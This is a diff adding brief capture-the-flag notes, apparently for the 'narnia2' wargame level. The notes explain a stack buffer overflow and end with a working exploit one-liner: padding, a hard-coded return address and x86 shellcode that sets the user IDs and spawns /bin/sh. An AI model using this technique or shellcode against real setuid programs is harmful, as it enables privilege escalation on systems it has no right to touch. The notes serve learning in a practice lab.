@@ -1,0 +1,14 @@
+Return address stored at: 0xffffd50c
+
+So we should try to place put (0xffffd510) into that location since if we are able to start overwriting with ou shellcode exactly on the return address then we should be good.
+We need to play around with the padding to be done before that.
+Or maybe start doing 'NOPs'. Do a NOP sledge. But we need to be good with the overwriting part..
+
+In below the NOP sledge is actually unnecessary since we know the stack location perfectly.No stack randomization is present at the host.
+
+We just need to set the reuid and euid to 14003 (0x36b3)(narnia3) in the setreuid shellode part.
+
+/narnia/narnia2 `python -c "print 'A'*140 + '\x10\xd5\xff\xff' + '\x32'*80 + '\x31\xc0\xb0\x46\x31\xdb\x66\xbb\xb3\x36\x66\x31\xc9\x66\x
+b9\xb3\x36\xcd\x80\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1
+\x89\xc2\xb0\x0b\xcd\x80'"`
+
